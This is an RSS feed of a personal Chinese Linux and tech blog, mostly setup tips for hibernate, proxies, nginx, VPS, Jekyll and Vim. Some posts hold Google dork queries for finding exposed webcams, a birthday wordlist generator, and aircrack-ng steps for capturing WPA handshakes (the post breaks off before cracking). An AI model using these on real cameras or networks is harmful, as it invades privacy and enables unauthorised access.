+ 计算机睡眠模式结合了待机和休眠的所有优点。将系统切换到睡眠状态后，系统会将内存中的数据全部转存到硬盘上的休眠文件中（这一点类似休眠），然后关闭除了内存外所有设备的供电，让内存中的数据依然维持着（这一点类似待机）。这样，当我们想要恢复的时候，如果在睡眠过程中供电没有发生过异常，就可以直接从内存中的数据恢复（类似待机），速度很快；但如果睡眠过程中供电异常，内存中的数据已经丢失了，还可以从硬盘上恢复（类似休眠），只是速度会慢一点。不过无论如何，这种模式都不会导致数据丢失。
+ 电脑睡眠
+而休眠是指：
+ 休眠在计算机科学中的含义指在关闭计算机的同时保持其运行状态。
+通过休眠，计算机将内存中的内容保存至硬盘或其它非易失存储器中，并在下次开机时从硬盘中将这些内容重新载入，使机器还原到与休眠前一致的状态。
+当用作保存电池电量的手段时，休眠与睡眠模式类似，不过比后者节约更多的电量，代价则是从休眠中恢复时速度更慢（因为硬盘的速度比内存慢得多）。
+ 电脑休眠
+ 在Linux内核中，休眠功能通过swsusp实现，并被内建在2.6版以后的内核中。替代性的实现是TuxOnIce，在3.4版以后的内核中作为补丁存在。另一个替代性的实现是uswsusp。
+ Linux默认不显示这个休眠选项，如果想要加进去的话（比如我有两个系统，一个ubuntu，一个win8，但是我不能让内存同使用有两种数据，但我还想开机速度更快些，并且保存原有的程序，那我就需要对系统进行休眠），可以这样做：
+1.先测试下电脑是否支持休眠
+sudo pm-hibernate 2.如果成功了，那就可以写入系统文件了
+sudo -i cd **/var/lib**/polkit-1/localauthority/50-local.d/ vi com.ubuntu.enable-hibernate.pkla （PS：如果配置不成功的话，你可以换一下路径，把/var/lib/换成/etc）
+3.将下列代码写入
+[Re-enable hibernate by default in upower] Identity=unix-user:* Action=org.freedesktop.upower.hibernate ResultActive=yes [Re-enable hibernate by default in logind] Identity=unix-user:* Action=org.freedesktop.login1.hibernate ResultActive=yes 4.重启电脑</description>
+    </item>
+    
+    <item>
+      <title>Make-a-startup-script-in-Ubuntu</title>
+      <link>https://wrfly.kfd.me/posts/make-a-startup-script-in-ubuntu/</link>
+      <pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/make-a-startup-script-in-ubuntu/</guid>
+      <description>There are many ways to make a script startup at boot. It&amp;rsquo;s quite easy to write a script. But the most important things are making it have the execute permission and making sure that your script&amp;rsquo;s path is correct.
+To make it execute, you need to put this command in you terminal
+chmod +x your_script.sh Be sure that you have write a ** absolute path ** in your script or you won&amp;rsquo;t get what you want.</description>
+    </item>
+    
+    <item>
+      <title>Nginx File not found 错误</title>
+      <link>https://wrfly.kfd.me/posts/nginx-file-not-found-%E9%94%99%E8%AF%AF/</link>
+      <pubDate>Sun, 15 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/nginx-file-not-found-%E9%94%99%E8%AF%AF/</guid>
+      <description>本文转自:http://www.nginx.cn/562.html
+略有修改.
+使用php-fpm解析PHP，&amp;rdquo;No input file specified&amp;rdquo;，&amp;rdquo;File not found&amp;rdquo;是令nginx新手头疼的常见错误，原因是php-fpm进程找不到SCRIPT_FILENAME配置的要执行的.php文件，php-fpm返回给nginx的默认404错误提示。
+比如网站default下没有test.php，访问这个文件时通过[抓包]可以看到返回的内容。(linux下可以通过 curl -I http://somesites.com/test.php来查看http头)
+curl -I http://somesites.com/test.php HTTP/1.1 404 Not Found Server: nginx Date: Sun, 15 Mar 2015 12:18:16 GMT Content-Type: text/html Content-Length: 162 Connection: keep-alive 一般会返回一个404的错误页面,但是在某些情况下也会出现&amp;rdquo;File not found.&amp;ldquo;这条提示信息.
+很多人不想用户直接看到这个默认的404错误信息，想自定义404错误.
+给出解决办法前我们来先分析下如何避免出现这类404错误，然后再说如果遇到这种情况(比如用户输入一个错误不存在的路径)时,怎样做才能显示自定义的404错误页。
+####一、错误的路径被发送到php-fpm进程####
+出现这类错误，十个有九个是后端fastcgi进程收到错误路径(SCRIPT_FILENAME)，而后端fastcgi收到错误路径的原因大都是配置错误。
+常见的nginx.conf的配置如下：  server { listen [::]:80; server_name example.com www.example.com; access_log /var/www/logs/example.com.access.log;
+location / { root /var/www/example.com; index index.html index.htm index.php; } location /images { autoindex on; } location ~ \.</description>
+    </item>
+    
+    <item>
+      <title>syntax-for-SOCKS-proxy-in-apt-conf</title>
+      <link>https://wrfly.kfd.me/posts/syntax-for-socks-proxy-in-apt-conf/</link>
+      <pubDate>Sat, 14 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/syntax-for-socks-proxy-in-apt-conf/</guid>
+      <description>在ubuntu下更新软件的时候,经常会遇到网络连接失败的情况,其实并不是服务器的问题,而是GFW在捣鬼,所以,我们不得不给apt-get加上一个代理,使其更新的时候可以通过代理访问.
+HTTP代理 1.在/etc/apt/apt.conf里面添加如下代码:
+Acquire::http::Proxy &#34;http://yourproxyaddress:proxyport&#34;; 再进行apt-get操作的时候就会通过代理访问目标服务器.
+2.设置临时代理
+切换root用户,在bash中输入: export http_proxy=http://yourproxyaddress:proxyport
+如果要使用sudo apt-get的话,你需要在/etc/sudoers里面添加: Defaults env_keep = &amp;ldquo;http_proxy https_proxy ftp_proxy&amp;rdquo;
+这样会在你sudo运行命令的时候保持原来的代理,不会因为切换了root用户而改变环境变量.
+3.设置永久代理
+在.bashrc文件里面添加如下代码:
+http_proxy=http://yourproxyaddress:proxyport export http_proxy 保存文件,并重新打开终端.
+PS:如果http代理需要认证的话,可以将原来的代码替换为:
+http_proxy=http://username:password@yourproxyaddress:proxyport SOCKS代理 如果你没用http代理,而是用的 shadowsocks 或者 ssh -D 这样的代理,那么你就需要一个转发的软件了,因为apt-get默认是不支持socks代理的,尽管网上有些人将http替换为了socks,那样也是不管用的.
+但是有种方法可以让 apt-get 走 socks 代理的流量, tsocks.
+首先你要安装tsocks.
+sudo apt-get install tsocks 然后在/etc/tsocks.cong的最下面设置好socks代理的服务器以及端口号.
+然后就可以使用代理了,具体操作如下:
+$ sudo -s # tsocks apt-get dist-upgrade # exit $ 或者这样:
+$ sudo -s # . tsocks -on # apt-get dist-upgrade # .</description>
+    </item>
+    
+    <item>
+      <title>VPS总结</title>
+      <link>https://wrfly.kfd.me/posts/vps%E6%80%BB%E7%BB%93/</link>
+      <pubDate>Tue, 10 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/vps%E6%80%BB%E7%BB%93/</guid>
+      <description>有了VPS可以干什么 前几天买了Digitalocean家的一台VPS，新加坡的最快，尽管很多人说旧金山的稳定。
+买VPS的初衷是用来翻墙，搭建一个VPN什么的，因为我也不知道有了VPS可以干嘛，除了翻墙。
+我电脑一直用着Goagent，php代理，香港的一台主机，当然，这也得多亏了coding团队的奉献，我也是借着人家的付出才翻得墙，虽然我知道他们不允许搭建代理应用&amp;ndash;。不道德吧，有点儿。
+手机原来用的是别人的shadowsocks，但是不知道为什么，那位好心人又把服务器关了，所以我借用的shadowsocks也不能用了，无奈之下才要买VPS，当然，只花了$5，因为github对教育的优惠。
+https://www.digitalocean.com/?refcode=642012c0a066
+这个是我的邀请链接，通过这个邀请链接注册之后，你会有十美元到账。之后就是通过paypal充5美元进去，这里需要用到绑定银行卡，然后账户里就有十五美元了～至少能用三个月呢～三十块钱，三个月的VPS，还是蛮划算的～
+然后我就来总结一下我搭建完这台VPS的经验吧。（顺便说一句，百度真是越来越垃圾了，出了搜索广告很牛逼，别的，真是不敢恭维。）
+学东西去官网，问问题去社区。这是我最到的收获之一。
+Login 新建了VPS，第一步当然是要登陆，可是问题来了，怎么登陆？
+Option 1. 密码
+你可以用digitalocean自带的发送一封密码邮件到你的邮箱里，接收root的密码。然后用ssh登陆：ssh root@your_vps_ip 然后输入密码就可以了。进入之后更改密码。
+Option 2. 密钥
+SSH Key是专用的名词，我翻译成密钥请不要打我。
+现在本地生成一对密钥，把 key.pub 粘贴到Digitalocean上，然后用你的私钥连接。 Details 妈蛋人家说的实在是太详细了，就连锁定SSH Key访问都说了。我就不在这里罗嗦了。一步一步来，总没有错的。
+进入了VPS之后，你得到的就是一个黑框，当然，也可以是绿的。
+命令行操作，不多说。
+先更新软件：
+然后就可以安装你想安装的东西了。
+Shadowsocks 安装shadowsocks的话，还是得看官方教程：Click me
+系统没有安装pip，要先自己安一下apt-get install pip
+然后我建议是在/opt目录下安装各种东西，给每一个软件mkdir一个文件夹，相关的文件全都放进去，查找的时候也好找。
+总之，不会的就去google，记得要用英文搜索。
+最重要的一点是开机启动的问题，我试了很多方法单就是不成功，不管是放在/etc/rc.local还是在/etc/init.d/里面，都不能够成功的开机启动，可能是我的脚本有问题吧。影响也不大，服务器又不是经常开机～
+安装VPN 我尝试过安装OpenVpn,从互联网的某个角落找到了一个一键安装的脚本，但是苦于不会弄，失败了。 我相信聪明的你一定会成功的。
+然后我就尝试了PPTP，详细的链接在这里，很详细了。那里面的第五步之后的全是客户端的配置，其实我们不用管，因为有图形化界面，自己添加一个VPN就好了，IP地址，用户名，密码。很感谢那些写教程的人。谢谢。
+Nginx或者Apache 既然是服务器那就少不了这两个大神，选择一个，然后安上，或者全部都要，但一定要记得更改默认端口，因为只能有一个开启80端口，另一个请改成8080或者其他的。这样才不会产生冲突。当然，如果你不做反代理什么的，没必要开俩。
+具体的安装步骤很简单，我不罗嗦。就是在配置的时候会有些麻烦，不过，既然我们有搜索引擎，那他们就该发挥他们的作用。搜一下，你会找到答案的。
+这里我要说的是，虚拟主机。
+以前我也不知道那些虚拟主机是怎么搞的，windows下的好理解，开端口或者图形化处理，都是很简单，那么linux下的要怎么弄？其实也很简单，无非就是在配置文件里添加一个name而已，在/etc/nginx/sites-enabled/里面，放着的是已经启用的网站，一般这里面的文件全是/etc/nginx/sites-available里面的软连接。
+在里面放一个文件，比如，virtualhost：  server { listen 80;
+root /var/www/virtualhost/html; index index.html index.htm; server_name yourdomain.com www.yourdomain.com; #这里的yourdomain.com就是你要解析到这台服务器上的地址，你在domain管理里面将网址A记录解析到这台服务器的IP就Ok了。 } } 
+关于那些php的配置，不在这里累赘。我把配置贴出来，照着葫芦画瓢吧～</description>
+    </item>
+    
+    <item>
+      <title>interesting-web-cameras</title>
+      <link>https://wrfly.kfd.me/posts/interesting-web-cameras/</link>
+      <pubDate>Wed, 18 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/interesting-web-cameras/</guid>
+      <description>google search:
+ inurl:CgiStart?page=Multi inurl:ViewerFrame?Mode=  or just visit
+ http://webcamcity.gosnippy.com</description>
+    </item>
+    
+    <item>
+      <title>趣文:-有趣的-Linux-命令</title>
+      <link>https://wrfly.kfd.me/posts/%E8%B6%A3%E6%96%87-%E6%9C%89%E8%B6%A3%E7%9A%84-linux-%E5%91%BD%E4%BB%A4/</link>
+      <pubDate>Tue, 10 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E8%B6%A3%E6%96%87-%E6%9C%89%E8%B6%A3%E7%9A%84-linux-%E5%91%BD%E4%BB%A4/</guid>
+      <description>1.sl 命令
+你会看到一辆火车从屏幕右边开往左边……
+安装
+$ sudo apt-get install sl 运行
+$ sl 命令有 -a l F e 几个选项，
+-a An accident seems to happen. You&amp;rsquo;ll feel pity for people who cry for help.
+-l shows little one.
+-F It flies.
+-e Allow interrupt by Ctrl+C.
+可以给别人来个恶作剧，他一敲ls，不知道的肯定很有效果
+$alias ls=sl 2.fortune 命令
+输出一句话，有笑话，名言什么的 (还有唐诗宋词sudo apt-get install fortune-zh)
+安装
+$sudo apt-get install fortune 运行
+$fortune 3.cowsay 命令
+用ASCII字符打印牛，羊等动物，还有个cowthink，这个是奶牛想，那个是奶牛说，哈哈，差不多
+安装
+$sudo apt-get install cowsay 运行</description>
+    </item>
+    
+    <item>
+      <title>Bash-Shortcuts</title>
+      <link>https://wrfly.kfd.me/posts/bash-shortcuts/</link>
+      <pubDate>Fri, 06 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/bash-shortcuts/</guid>
+      <description>The shortcuts listed here are based on GNU bash version 3.00. The abbreviation of &amp;ldquo;CTRL-a&amp;rdquo; means to press and hold down the Control key and press &amp;lsquo; a &amp;rsquo; once. The shortcuts should be the same for most other shells.
+The basic moving shortcuts allow movement to the end of the line, to the start of the line or to step through by character. The commands come in really handy when editing different file in another directory or copying files.</description>
+    </item>
+    
+    <item>
+      <title>Bash快捷键相关</title>
+      <link>https://wrfly.kfd.me/posts/bash%E5%BF%AB%E6%8D%B7%E9%94%AE%E7%9B%B8%E5%85%B3/</link>
+      <pubDate>Thu, 05 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/bash%E5%BF%AB%E6%8D%B7%E9%94%AE%E7%9B%B8%E5%85%B3/</guid>
+      <description>bash快捷操作
+生活在 Bash shell 中，熟记以下快捷键，将极大的提高你的命令行操作效率。
+编辑命令
+Ctrl + a ：移到命令行首 Ctrl + e ：移到命令行尾 Ctrl + f ：按字符前移（右向） Ctrl + b ：按字符后移（左向） Alt + f ：按单词前移（右向） Alt + b ：按单词后移（左向） Ctrl + xx：在命令行首和光标之间移动 Ctrl + u ：从光标处删除至命令行首 Ctrl + k ：从光标处删除至命令行尾 Ctrl + w ：从光标处删除至字首 Alt + d ：从光标处删除至字尾 Ctrl + d ：删除光标处的字符 Ctrl + h ：删除光标前的字符 Ctrl + y ：粘贴至光标后 Alt + c ：从光标处更改为首字母大写的单词 Alt + u ：从光标处更改为全部大写的单词 Alt + l ：从光标处更改为全部小写的单词 Ctrl + t ：交换光标处和之前的字符 Alt + t ：交换光标处和之前的单词 Alt + Backspace：与 Ctrl + w 类似 重新执行命令</description>
+    </item>
+    
+    <item>
+      <title>linux下的360wifi</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E7%9A%84360wifi/</link>
+      <pubDate>Wed, 04 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E7%9A%84360wifi/</guid>
+      <description>今天把之前买过的一个360wifi放在了linux下，网上很多教程，我也走了很多弯路，不过，感谢那些前辈，让生活变得更美好～
+thank you very much!
+直接贴网址吧，英文的，很容易懂。
+亲测可用，系统环境：Linux ubuntu 3.13.0-44-generic 以及 Linux kali 3.14-kali1-amd64
+http://askubuntu.com/questions/575413/ralink-148f760b-mt7601-driver-kernel-panic-on-ubuntu-14-04
+以上是问题的详情，下面的是github的网址：
+https://github.com/porjo/mt7601.git
+https://github.com/porjo/mt7601
+感谢！
+同样，这代码也应该适用于腾讯wifi，小度wifi，小米wifi等相同产品，不过本人没有亲自测试。
+如果这篇文章对您有用，请把他分享给更多的人，如果在便以过程中与到了什么问题，也可以在下方留言，我们一起进行讨论～
+然后，我所有的步骤全是从google上找到的，感谢google～同时鄙视一下百度、、
+百度搜索到的一些教程在我的电脑上并不实用，很有可能是内核版本的问题，不过，我的内核版本可是最新的呀。。。。
+转载请注明出处，谢谢。
+10-30日更：
+之前写过一个kali安装360wifi的脚本： https://gist.github.com/wrfly/08da52c72904de2400e7
+多亏了一个同学提醒我～</description>
+    </item>
+    
+    <item>
+      <title>破解Wifi密码的时候</title>
+      <link>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99/</link>
+      <pubDate>Tue, 03 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99/</guid>
+      <description>破解wpa/wpa2的密码是一件简单的事情但不是一件容易的事情。
+遇到的第一个问题就是密码库，鉴于很多人喜欢把生日作为密码，那么我就从生日开始猜测了。
+先写一个生成密码的小程序：
+#include &amp;lt;iostream&amp;gt;#include &amp;lt;iomanip&amp;gt;using namespace std; int main(){ int y = 1970; for(; y &amp;lt; 2016; y ++) for(int m = 1; m &amp;lt; 13; m ++) if(m == 2) for(int d = 1; d &amp;lt; 30; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; else if(m == 4|| m == 6|| m == 9|| m == 11) for(int d = 1; d &amp;lt; 31; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; else for(int d = 1; d &amp;lt; 32; d ++) cout&amp;lt;&amp;lt;y&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;m&amp;lt;&amp;lt;setw(2)&amp;lt;&amp;lt;setfill(&amp;#39;0&amp;#39;)&amp;lt;&amp;lt;d&amp;lt;&amp;lt;endl; return 0; } 生成的密码文件在这儿</description>
+    </item>
+    
+    <item>
+      <title>破解Wifi密码的时候-2</title>
+      <link>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/</link>
+      <pubDate>Tue, 03 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81%E7%9A%84%E6%97%B6%E5%80%99-2/</guid>
+      <description>上一篇中我说了制作生日密码的小程序，记录了一下字典的生成方式，那么这一篇中我摘抄了网上的教程，一步一步走下来，还是挺简单的。原本着想从视频中学习点东西，但是看了这篇教程以后发现文字版的更适合我～
+我也希望会适合你～
+PS：非法破解他人密码是违法行为，本人一切行为均在自己手机中进行。请大家测试的时候遵守法律法规。
+此文分享自shellhacks
+0.安装 Aircrack-ng
+$ sudo apt-get install build-essential libssl-dev libnl-3-dev pkg-config libnl-genl-3-dev 下载最新版的 Aircrack-ng：
+ $ wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc1.tar.gz -O - | tar -xz $ cd aircrack-ng-1.2-rc1 $ sudo make $ sudo make install  1.打开网卡的监听模式
+首先结束可能会导致问题的进程：
+$ sudo airmon-ng check kill 然后开启网卡监听模式：
+$ sudo airmon-ng start wlan0 看一下现在的网卡在mon0上是打开的监听模式的。
+ 打开Airodump-ng来收集认证信息
+$ sudo airodump-ng mon0
+  然后选择特定的MAC地址进行测试：
+$ sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one 上面这条命令的运行结果是这样的：</description>
+    </item>
+    
+    <item>
+      <title>hide unity panle when use virtualbox full screen model</title>
+      <link>https://wrfly.kfd.me/posts/hide-unity-panle-when-use-virtualbox-full-screen-model/</link>
+      <pubDate>Thu, 01 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/hide-unity-panle-when-use-virtualbox-full-screen-model/</guid>
+      <description>Question:
+Answer: &amp;gt; Disabling mini-toolbar in VMs settings is a temporary work-around. In the VirtualBox manager go to Settings-&amp;gt;General-&amp;gt;Advanced tab -&amp;gt; Mini ToolBar [] Show in Fullscreen/Seamless and make sure it is unchecked.
+在Ubuntu 下运行 VirtualBox ，开一个虚拟机，全屏模式，Unity的panle会一直显示。
+取消显示只需在虚拟机的设置里把“全屏模式下显示小工具栏”取消就可以了。
+在虚拟机的&amp;ndash;设置&amp;ndash;常规&amp;ndash;高级&amp;ndash;小工具栏。
+![setting/img/hide-unity-panle-in-virtualbox/setting.png)
+取消之前是这样的
+![before/img/hide-unity-panle-in-virtualbox/before.png)
+取消之后是这样的
+![after/img/hide-unity-panle-in-virtualbox/after.png)
+原文链接</description>
+    </item>
+    
+    <item>
+      <title>kali nginx php</title>
+      <link>https://wrfly.kfd.me/posts/kali-nginx-php/</link>
+      <pubDate>Thu, 01 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/kali-nginx-php/</guid>
+      <description>今天在Kali下配置了Nginx，但是php一直开不起来，妈蛋，搞了好久好久，原来是 php5-frm 没有重启。坑死了。
+先安装php-fpm
+apt-get install php5-fpm 然后修改nginx的配置文件:
+vim /etc/nginx/sites-available/default 里面php-fpm的默认配置是注释掉的 
+pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ .php$ {
+fastcgi_split_path_info ^(.+.php)(/.+)$; # NOTE: You should have &amp;ldquo;cgi.fix_pathinfo = 0;&amp;rdquo; in php.ini #
+# With php5-cgi alone: fastcgi_pass 127.0.0.1:9000; # With php5-fpm: fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; include fastcgi_params; #}  改成
+location ~ \.php$ { fastcgi_split_path_info ^(.+\.php)(/.+)$; # # NOTE: You should have &amp;#34;cgi.</description>
+    </item>
+    
+    <item>
+      <title>build-my-jekyll-blog</title>
+      <link>https://wrfly.kfd.me/posts/build-my-jekyll-blog/</link>
+      <pubDate>Mon, 29 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/build-my-jekyll-blog/</guid>
+      <description>I suggest U visit this site first.
+-Jekyll&amp;rsquo;home page-
+ md文件末尾不能存在空格，否则浏览器解析会出错误
+ jekyll插入图片格式 “ ![name](link) ”
+ md的名字中存在的&amp;rdquo;-&amp;ldquo;会被解析成空格
+ 首先要在本地搭建好jekyll环境，
+   sudo apt-get install gem sudo gem install jekyll sudo gem install [相关组件]  可以搜一下 jekyll-now 或者 jekyll bootstrap，都有详细的教程。
+大体目录：  . ├── 404.html #404页面 ├── about.html #about页面 ├── archive.html #汇总页面 ├── assets #css，js文件存放 │ ├── css │ │ ├── pygment-trac.css │ │ └── stylesheet.css │ └── js │ ├── main.</description>
+    </item>
+    
+    <item>
+      <title>Tags in jekyll(github)</title>
+      <link>https://wrfly.kfd.me/posts/tags-in-jekyllgithub/</link>
+      <pubDate>Sat, 27 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/tags-in-jekyllgithub/</guid>
+      <description>This artical helps you how to build Tag page in your own &amp;ldquo;Jekyll&amp;rdquo; blog.
+First, creat a html file in your root directory, put the code in it:
+--- layout: default title: Tags in jekyll(github) permalink: /tag/ --- {## capture tags##} {## for tag in site.tags##} {{ tag[0] }} {## endfor ##} {## endcapture ##} {## assign sortedtags= tags | split:&amp;#39; &amp;#39; | sort ##} {## for tag in sortedtags##} &amp;lt;h3 id=&amp;#34;{{ tag }}&amp;#34;&amp;gt;{{ tag }}&amp;lt;/h3&amp;gt; &amp;lt;ul&amp;gt; {## for post date: 2014-12-27 title: Tags in jekyll(github) &amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;{{ post date: 2014-12-27 title: Tags in jekyll(github) {## endfor ##} &amp;lt;/ul&amp;gt; {## endfor ##} Then, in your post date: 2014-12-27 title: Tags in jekyll(github)</description>
+    </item>
+    
+    <item>
+      <title>20141226</title>
+      <link>https://wrfly.kfd.me/posts/20141226/</link>
+      <pubDate>Fri, 26 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/20141226/</guid>
+      <description>第一个决定是，把我在blogger上面的文章全都同步到这儿来，然后，那个blogger就算abortion了吧。
+原因很简单：麻烦。
+第二个决定是做一件有意义的事情&amp;mdash;翻译一下VIM的入门教程。
+尽管我知道已经有很多VIM的教程，还有一些中文版的说明文档什么的。但是昨天晚上看到了一片很好的入门教程，可惜是英文的，而且是一个单页面，我寻思工作量也不大，索性就当成一个项目来做吧，我觉得那一篇比网上的若干教程强多了～顺便放出原链接以及一个很“好玩”的练习VIM的网站</description>
+    </item>
+    
+    <item>
+      <title>Guide to Vim</title>
+      <link>https://wrfly.kfd.me/posts/guide-to-vim/</link>
+      <pubDate>Thu, 25 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/guide-to-vim/</guid>
+      <description>Vim使用
+The Basics of Moving in Vim
+The first thing you&amp;rsquo;ll want to learn is how to move around a file. When you&amp;rsquo;re in command mode, you&amp;rsquo;ll want to remember the following keys and what they do:
+h moves the cursor one character to the left. j moves the cursor down one line. k moves the cursor up one line. l moves the cursor one character to the right. 0 moves the cursor to the beginning of the line.</description>
+    </item>
+    
+    <item>
+      <title>Ubuntu自定义Applications</title>
+      <link>https://wrfly.kfd.me/posts/ubuntu%E8%87%AA%E5%AE%9A%E4%B9%89applications/</link>
+      <pubDate>Tue, 23 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/ubuntu%E8%87%AA%E5%AE%9A%E4%B9%89applications/</guid>
+      <description>用户自己的软件都放在 ~/.local/share/applications/ 目录下面，所以，要想添加软件到menu，只要把写好的desktop文件放到里面就可以了。desktop文件的基本格式如下:
+[Desktop Entry] Name=Your Application Exec=The application exec path(.sh/exe/.py/etc.) Icon=The application&amp;#39;s icon path. Type=Application Categories=GTK;GNOME;Utility; 放入目录中后在menu中就可以找到你的软件了。
+要是想在整个系统中都可以运行你的程序（让所有的用户都可以运行），只需要把desktop文件放到/usr/share/applications/目录中即可。(or ~/.local/share/applications)
+See: https://developer.gnome.org/integration-guide/stable/desktop-files.html.en</description>
+    </item>
+    
+    <item>
+      <title>linux下利用C实现输入密码返回*的功能</title>
+      <link>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E5%88%A9%E7%94%A8c%E5%AE%9E%E7%8E%B0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%BF%94%E5%9B%9E%E7%9A%84%E5%8A%9F%E8%83%BD/</link>
+      <pubDate>Mon, 22 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%8B%E5%88%A9%E7%94%A8c%E5%AE%9E%E7%8E%B0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%BF%94%E5%9B%9E%E7%9A%84%E5%8A%9F%E8%83%BD/</guid>
+      <description>C++也兼容这个功能
+#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;termios.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;assert.h&amp;gt;int getch(void); char psw[20];//初始化密码为空&amp;#34;&amp;#34;; int length=0; //初始化密码长度 void inputPassword()//用于输入并回显*为密码 { char temp_c; printf(&amp;#34;password:&amp;#34;); while(1) { temp_c=getch(); //输入一个字符  if(temp_c!=&amp;#39;\n&amp;#39;) //判断该字符是不为回车，如果是则退出while  { switch (temp_c) { case 127: if(length!=0) { printf(&amp;#34;\b\b&amp;#34;); length--; } else; break; default: printf(&amp;#34;*&amp;#34;); //可用用你喜欢的任意字符，如改为puts&amp;#34;&amp;#34;;则无回显  psw[length] = temp_c;//连成字符串；  length++; break; } } else break; } psw[length] = &amp;#39;\0&amp;#39;; } char* getpassword()//返回一个密码字符串。 { return psw; } int getch(void) { int c=0; struct termios org_opts, new_opts; int res=0; //----- store old settings -----------  res=tcgetattr(STDIN_FILENO, &amp;amp;org_opts); assert(res==0); //---- set new terminal parms --------  memcpy(&amp;amp;new_opts, &amp;amp;org_opts, sizeof(new_opts)); new_opts.</description>
+    </item>
+    
+    <item>
+      <title>关于Ubuntu的PATH</title>
+      <link>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Eubuntu%E7%9A%84path/</link>
+      <pubDate>Fri, 19 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/%E5%85%B3%E4%BA%8Eubuntu%E7%9A%84path/</guid>
+      <description>修改ubuntu下私人用户的PATH:
+Ubuntu的环境变量，一个是存放在&amp;rdquo;environment&amp;rdquo;文件里，另外一个是在&amp;rdquo;.profile&amp;rdquo;文件中
+如果你想在PATH中添加自己的路径，那么在 ~/.profile文件最后的export PATH=后面加上:~/.bash_shell/: 就能运行你放在这个目录中的脚本程序了。
+当然，前提是你要在用户目录下面创建一个那样的文件夹。</description>
+    </item>
+    
+    <item>
+      <title>php反代理以及goagent php代理</title>
+      <link>https://wrfly.kfd.me/posts/php%E5%8F%8D%E4%BB%A3%E7%90%86%E4%BB%A5%E5%8F%8Agoagent-php%E4%BB%A3%E7%90%86/</link>
+      <pubDate>Thu, 18 Dec 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/php%E5%8F%8D%E4%BB%A3%E7%90%86%E4%BB%A5%E5%8F%8Agoagent-php%E4%BB%A3%E7%90%86/</guid>
+      <description>一下午没去上课，弄了下php反代理。因为看到有一些谷歌的镜像网站，很神奇，所以我也尝试着做了一个&amp;ldquo;google.love-u.me&amp;rdquo; &amp;amp; &amp;ldquo;youtube.love-u.me&amp;rdquo;谷歌可以用，但是youtube就不行了,只能看看图片，视频还看不了。
+其实这中间的原理我也不是很懂，大概的意思是让php去请求你所需的网页，然后再回来。相当于一层代理了吧。我用的是7ghost的代码，那个项目也已经好久不更新了，但是代码还是可以用的，给他点个赞！
+然后，由于学校的ipv6也不是很稳定，goagent上面的ipv4地址更是经常挂，所以我就尝试了一下php代理服务器，也很简单，把那些文件放到国外的php空间上就ok了，原理估计跟上面的差不多。
